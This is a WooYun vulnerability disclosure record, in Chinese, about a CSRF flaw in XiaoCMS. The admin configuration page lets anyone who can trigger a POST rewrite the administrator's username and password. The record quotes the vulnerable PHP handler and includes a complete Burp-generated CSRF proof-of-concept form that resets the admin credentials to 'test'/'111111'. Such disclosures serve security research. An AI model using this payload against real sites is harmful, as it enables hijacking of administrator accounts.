{"id": 53523, "wybug_id": "wooyun-2014-067402", "wybug_title": "XiaoCMS设计缺陷可CSRF改管理员用户名/密码", "wybug_corp": "XiaoCMS", "wybug_author": "路人甲", "wybug_date": "2014-07-04 18:53", "wybug_open_date": "2014-10-02 18:56", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-10-02：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： csrf 详细说明：  这个设计真的很难理解，修改密码的地方也可以直接修改管理员用户名，而且不是存在数据库中，而是将用户名密码存在/data/config/admin.ini.php中\npublic function configAction() {\t\t$admin         = xiaocms::load_config('admin');\t    $data         =  $this->site_config;        if ($this->post('submit')) {            $postadmin = $this->post('admin');\t\t\tif(empty($postadmin['admin_pass']) )\t\t\t$postadmin['admin_pass'] =$admin['admin_pass'];\t\t\telse\t\t\t$postadmin['admin_pass'] = md5(md5($postadmin['admin_pass']));\t\t\t$admin_arr = var_export($postadmin,true);\t\t\t$admin_txt = \"<?php\" . PHP_EOL . \"if (!defined('IN_XIAOCMS')) exit();\" . PHP_EOL . \"return \" . $admin_arr. \";\";            file_put_contents(DATA_DIR . 'config' . DIRECTORY_SEPARATOR . 'admin.ini.php', $admin_txt);            $configdata = $this->post('data');\t\t\t$configdata['rand_code']= md5(microtime());\t\t\t$config_arr = var_export($configdata,true);\t\t\t$config_txt = \"<?php\" . PHP_EOL . \"if (!defined('IN_XIAOCMS')) exit();\" . PHP_EOL . \"return \" . $config_arr. \";\";            file_put_contents(DATA_DIR . 'config' . DIRECTORY_SEPARATOR . 'config.ini.php', $config_txt);            $this->show_message('修改成功', 1, url('index/config', array('type'=>$this->get('type'))));        }        $file_list=glob(TEMPLATE_DIR.'*');\t\t$arr= array();        foreach($file_list as $v) {\t       \tif(is_dir($v))            $arr[] = basename ($v);        }        $theme = array_diff($arr, array('mobile'));\t    $type  = $this->get('type') ? $this->get('type') : 1;\t\t$membermodel  = get_cache('member_model');        include $this->admin_tpl('config');\t}\n可以看到，所谓的修改密码，其实就是往配置文件中写入新的密码，同时没有做任何校验，所以用户名和密码两个参数都可以随便更改。懒得动手就直接拿burp生成的poc测试下：\n<html>  <!-- CSRF PoC - generated by Burp Suite Professional -->  <body>    <form action=\"http://localhost/xiaocms/admin/index.php?c=index&a=config&type=3\" method=\"POST\">      <input type=\"hidden\" name=\"data&#91;site&#95;name&#93;\" value=\"XiaoCmsä&#188;&#129;ä&#184;&#154;å&#187;ºç&#171;&#153;ç&#137;&#136;\" />      <input type=\"hidden\" name=\"data&#91;site&#95;theme&#93;\" value=\"default\" />      <input type=\"hidden\" name=\"data&#91;site&#95;mobile&#93;\" value=\"1\" />      <input type=\"hidden\" name=\"data&#91;site&#95;title&#93;\" value=\"XiaoCmsæ&#188;&#148;ç&#164;ºç&#171;&#153;\" />      <input type=\"hidden\" name=\"data&#91;site&#95;keywords&#93;\" value=\"xiaocms\" />      <input type=\"hidden\" name=\"data&#91;site&#95;description&#93;\" value=\"æ&#172;&#162;è&#191;&#142;ä&#189;&#191;ç&#148;&#168;xiaocmså&#134;&#133;å&#174;&#185;ç&#174;&#161;ç&#144;&#134;ç&#179;&#187;ç&#187;&#159;&#32;å&#174;&#152;æ&#150;&#185;ç&#189;&#145;ç&#171;&#153;ï&#188;&#154;http&#58;&#47;&#47;www&#46;xiaocms&#46;com\" />      <input type=\"hidden\" name=\"data&#91;site&#95;download&#95;image&#93;\" value=\"1\" />      <input type=\"hidden\" name=\"data&#91;admin&#95;template&#93;\" value=\"1\" />      <input type=\"hidden\" name=\"data&#91;admin&#95;list&#95;size&#93;\" value=\"10\" />      <input type=\"hidden\" name=\"data&#91;site&#95;status&#93;\" value=\"2&#124;å&#164;&#180;æ&#157;&#161;&#13;&#10;3&#124;æ&#142;&#168;è&#141;&#144;&#13;&#10;0&#124;æ&#156;ªå&#174;&#161;æ&#160;&#184;\" />      <input type=\"hidden\" name=\"data&#91;site&#95;watermark&#93;\" value=\"0\" />      <input type=\"hidden\" name=\"data&#91;site&#95;watermark&#95;pos&#93;\" value=\"9\" />      <input type=\"hidden\" name=\"admin&#91;admin&#95;name&#93;\" value=\"test\" />      <input type=\"hidden\" name=\"admin&#91;admin&#95;pass&#93;\" value=\"111111\" />      <input type=\"hidden\" name=\"data&#91;member&#95;modelid&#93;\" value=\"5\" />      <input type=\"hidden\" name=\"data&#91;member&#95;register&#93;\" value=\"1\" />      <input type=\"hidden\" name=\"data&#91;member&#95;status&#93;\" value=\"1\" />      <input type=\"hidden\" name=\"data&#91;member&#95;regcode&#93;\" value=\"1\" />      <input type=\"hidden\" name=\"data&#91;member&#95;logincode&#93;\" value=\"1\" />      <input type=\"hidden\" name=\"data&#91;diy&#95;url&#93;\" value=\"0\" />      <input type=\"hidden\" name=\"data&#91;list&#95;url&#93;\" value=\"&#123;catdir&#125;&#47;\" />      <input type=\"hidden\" name=\"data&#91;list&#95;page&#95;url&#93;\" value=\"&#123;catdir&#125;&#47;list&#95;&#123;page&#125;&#46;html\" />      <input type=\"hidden\" name=\"data&#91;show&#95;url&#93;\" value=\"&#123;catdir&#125;&#47;&#123;id&#125;&#46;html\" />      <input type=\"hidden\" name=\"data&#91;show&#95;page&#95;url&#93;\" value=\"&#123;catdir&#125;&#47;&#123;id&#125;&#95;&#123;page&#125;&#46;html\" />      <input type=\"hidden\" name=\"submit\" value=\"æ&#143;&#144;äº&#164;\" />      <input type=\"submit\" value=\"Submit request\" />    </form>  </body></html>\n用户名密码改成test，111111\n\n\n\n\n\n\n\n\n\n   漏洞证明：  \n\n\n\n\n\n\n\n\n\n   修复方案：  xx   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}